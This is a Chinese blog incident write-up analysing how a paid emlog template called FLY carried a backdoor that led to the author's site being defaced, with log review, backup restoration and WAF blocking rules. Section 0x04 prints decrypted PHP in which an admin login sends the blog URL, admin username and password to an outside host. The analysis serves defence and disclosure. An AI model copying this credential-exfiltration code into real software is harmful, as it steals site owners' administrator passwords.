**作者：jasonx**

**原文来自：[记一次博客被日的分析过程](https://bbs.ichunqiu.com/thread-44743-1-1.html?from=beef)
**

#### 前言：

人在江湖漂，哪能不挨刀。小弟我的博客在21号被日了，想不到从来都是我日人，如今却惨被人日（悲伤脸）

其实挨刀不可怕，可怕的是他砍到了我这块铁板上，滋出了一溜的火花。所谓知己知彼方能百战不殆，必须知道对方是如何拿下我网站的，如果不分析出原因，下次被日的还是小弟我。

所以接下来，我们要对整个入侵事件进行一次简单的分析。

### 0x01 博客基本情况

我博客用的系统是 centos6，博客程序是emlog的cms。模块是一个付费模块【fly】  
说实话这个模块挺好看的，首次安装的时候我就D盾扫了下，看看是不是有后门，扫描结果除了发现几个加密的php文件，其他看起来也没啥毛病，所以就没管了，想不到就是这几个加密文件，才导致了博客被入侵。

被入侵的时间是8月21号，登录服务器后发现文件被删，index.php文件被篡改。  
文件修改时间是2018年8月21日18:04:15  
被挂的黑页如下：

![image.png](https://image.3001.net/images/20180824/1535094971_5b7fb0bb7ad7e.png!small)  

等等，这他妈不是我使用的模块售后群吗？  
难道是作者日了我的站点？  
当然不排除是其他黑客日了以后故意甩锅给作者，所以我们先来分析一下日志再说。

### 0x02 入侵过程分析

首先我博客是用宝塔的控制面板，但是我888端口做了白名单，只有跳板IP可以访问这个端口，ssh端口也做了白名单，没有开放ftp，mysql没有开放外联，waf用的云锁。

第一步我们先登录云锁看看，在20号左右没有发现可疑日志。

那么我们先看看日志吧，先拨号上跳板，然后输入xxxx.cc:888登录云锁控制台。

然后进入【安全】菜单，点击web日志的路径进入。

![image.png](https://image.3001.net/images/20180824/1535094990_5b7fb0cedf3ab.png!small)

然后下载19号之前和22号以后的日志![image.png](https://image.3001.net/images/20180824/1535095014_5b7fb0e6926b1.png!small)

  

我的博客也没啥流量，所以日志文件比较小，直接notepad++打开就行了。  
因为之前看到那个黑页的修改时间是2018年8月21日16:15:15  
所以直接定位到8月21日18点04分左右的部分开始看.

直接在notepad++里面查找关键词【.php】

![image.png](https://image.3001.net/images/20180824/1535095026_5b7fb0f2d95c4.png!small)

然后定位到18点以后的部分。

![image.png](https://image.3001.net/images/20180824/1535095038_5b7fb0fed03ab.png!small)

疑似入侵者IP：222.240.56.48  
查询一下，湖南长沙的

现在咱们挨个文件看看他是如何发起攻击的。

### 0x03 多做备份才能减少损失

因为博客上的文件已经被他删得差不多了，只剩下一些配图文件夹，不过还好本屌对接了阿里云的oss。  
每3天自动备份整站到阿里云oss。

这里不得不赞一下阿里云的oss，如果只是归档存储的话，价格很便宜，不下载备份文件不用付费，只要购买储存空间就行了

我们登录阿里云控制台，进入oss存储。

![image.png](https://image.3001.net/images/20180824/1535095055_5b7fb10f169ca.png!small)  

然后进入文件管理，可以看到在19号之前的备份文件都是30多M  
但是22号以后备份只有10多M了

![image.png](https://image.3001.net/images/20180824/1535095066_5b7fb11a23bc7.png!small)  

所以我们得下载19号的这个备份文件去恢复到博客。  
点击19号这个文件，进入以后解冻文件，然后等大概两分钟就会解冻成功。

![image.png](https://image.3001.net/images/20180824/1535095071_5b7fb11fda469.png!small)  

然后就能看到下载地址了，直接下载后上传到我们博客，然后解压就行了。

#### \----小提示----
在恢复站点前，我们先闭站。  
先把80端口和443端口加个白名单，只允许我们的IP访问，这样可以避免在你没有查出问题之前，又被人给日了。

### 0x04 官方后门 最为致命

他访问的第一个文件 /include/lib/checkcode.php

我们本地访问以下看看，发现这是验证码的文件。

  
![image.png](https://image.3001.net/images/20180824/1535095079_5b7fb1275d56f.png!small)  

第二个文件/content/templates/FLY/inc/ajax.php?a=ajax  
我们直接访问后显示；  
{"code":"208"}

![image.png](https://image.3001.net/images/20180824/1535095089_5b7fb13163f82.png!small)  

如果管理员处于登录博客状态，会返回账号密码等等数据。

![image.png](https://image.3001.net/images/20180824/1535095096_5b7fb13824ed5.png!small)  

那么问题肯定出在这个ajax.php上面了，我们打开看看。  
厉害厉害，加密了，这里非常感谢“空格表哥”帮忙解密了这个文件

![image.png](https://image.3001.net/images/20180824/1535095103_5b7fb13f9e66b.png!small)  

我们查找ajax看看，发现在这里，账号密码被打印出来了。

![image.png](https://image.3001.net/images/20180824/1535095108_5b7fb144875bc.png!small)  

日志里面发现post了一个数据  
/content/templates/FLY/inc/ajax.php?a=login

![image.png](https://image.3001.net/images/20180824/1535095115_5b7fb14bd58a1.png!small)  

我们在解密后的ajax.php里面搜索login看看  
好家伙，官方后门真可怕，看到我注释的地方，已经明白大概是啥意思了。

![image.png](https://image.3001.net/images/20180824/1535095122_5b7fb1521855a.png!small)  

我们登录博客后台后，会把url 账号 密码等等数据传送到作者的以下地址。  
<https://api.pjax.cn/i.php?data>=

贴上代码

    
    
    if ($_GET['a'] == 'login') {
            $username = isset($_POST['user']) ? addslashes(trim($_POST['user'])) : '';
            $password = isset($_POST['pw']) ? addslashes(trim($_POST['pw'])) : '';
            $ispersis = isset($_POST['ispersis']) ? intval($_POST['ispersis']) : false;
            $img_code = Option::get('login_code') == 'y' && isset($_POST['imgcode']) ? addslashes(trim(strtoupper($_POST['imgcode']))) : '';
            $errorCode = LoginAuth::checkUser($username, $password, $img_code);
            if ($errorCode === true) {
                    LoginAuth::setAuthCookie($username, $ispersis);
                    $userinfo = LoginAuth::getUserDataByLogin($username);
                    $json = array('code' => '200', 'data' => $userinfo);
                    $tempath = @file_get_contents(EMLOG_ROOT . '/content/templates/FLY/fonts/FontAwesome.woff');
                    $tempath = base64_decode($tempath);
                    if ($tempath != BLOG_URL && $userinfo['role'] == 'admin') {
                            #$url = 'https://api.pjax.cn/i.php?data=' . urlencode('盗版地址：' . BLOG_URL . '|盗版管理员账号：' . $username . '|盗版管理员密码：' . $password . '|泄露源：' . $tempath);
                            #$data = @file_get_contents($url);
                    }
            } else {
                    if ($errorCode == '-3') {
                            $json = array('code' => '201', 'info' => '验证码输入有误');
                    } else {
                            if ($errorCode == '-1') {
                                    $json = array('code' => '202', 'info' => '账号或密码错误');
                            } else {
                                    if ($errorCode == '-2') {
                                            $json = array('code' => '203', 'info' => '账号或密码错误');
                                    }
                            }
                    }
            }
            echo json_encode($json);

我们继续往下看。

在这里他上传了一个模块文件，然后安装。

![image.png](https://image.3001.net/images/20180824/1535095137_5b7fb161b9b2b.png!small)  

因为日志里面没有发现他访问了其他PHP文件，所以我首页文件index.php被修改的可能只有一个，就是他上传的模块里面已经写好了黑页，然后上传模块，覆盖掉我网站上面的首页文件。

然后删除我的模块，这也证明了为什么只删除了模块，而我文章配图文件夹都还在的原因。

![image.png](https://image.3001.net/images/20180824/1535095151_5b7fb16f55c06.png!small)  

### 0x05 我们该去找找攻击者了

先再确认一下是不是作者干的，通过日志已经知道IP地址了。  
222.240.56.48  
查询是湖南长沙的。

![image.png](https://image.3001.net/images/20180824/1535095161_5b7fb179f0723.png!small)  

没错了，就是你了，直接问下作者是啥意思。

  
![image.png](https://image.3001.net/images/20180824/1535095180_5b7fb18cb3b20.png!small)![image.png](https://image.3001.net/images/20180824/1535095189_5b7fb1959fc5a.png!small)![image.png](https://image.3001.net/images/20180824/1535095206_5b7fb1a6dc73f.png!small)  

事情已经很明了啦，因为我之前购买以后换过一次域名，作者以为我现在这个域名是盗用了他的模块，然后把我日的，躺枪了，这他妈是误伤啊。但是模块存在后门这个是事实。

### 总结下过程

1.作者在/content/templates/FLY/inc/ajax.php文件里面写了个后门  
2.我们正常登录后台以后，会自动把你的后台地址，账号密码发送到作者哪里  
3.然后作者那边有个授权列表，会做对比，如果不在授权列表里面，会单独标记出来。  
4.然后某一天你就被作者删模块，挂黑页了.....

### 避免被日方法

以防护软件【云锁】为例；  
打开云锁，进入详细设置

![image.png](https://image.3001.net/images/20180824/1535095225_5b7fb1b9673f1.png!small)  

进入漏洞防护设置

![image.png](https://image.3001.net/images/20180824/1535095231_5b7fb1bf9caf5.png!small)  

新增一条防护规则

![image.png](https://image.3001.net/images/20180824/1535095242_5b7fb1ca6d517.png!small)  

用正则禁止访问/admin后台下的文件。  
正则表达式；  
/admin([\s\S]*?)  
注意：新增这个规则以后你会无法访问后台，不过你可以把你ip或者跳板机加入白名单，以后只有你跳板机和你IP可以访问/admin下面的所有文件。

![image.png](https://image.3001.net/images/20180824/1535095249_5b7fb1d1405c5.png!small)  

继续禁止ajax=login  
([\s\S]*?)?a=login

![image.png](https://image.3001.net/images/20180824/1535095259_5b7fb1db31d44.png!small)  

禁止下列几个文件访问  
useragent_setting.php  
install.php.lock  
setting.php  
functions.php

### 写在最后

虽然这是一起误伤事件，但是改变不了把我站日了的事实，所以，我做了一个决定，直接公开你的模块，并写出避免被日的方法。  
收费模块在最后，[阅读原文](https://bbs.ichunqiu.com/thread-44743-1-1.html?from=beef)可见。

ajax文件后门部分已经被我注释掉了，表哥们安心使用就是了。  
另外有几个加密文件不知道干啥用的，有兴趣的表哥们自行解密研究看看。

**原文来自：[记一次博客被日的分析过程](https://bbs.ichunqiu.com/thread-44743-1-1.html?from=beef)
**

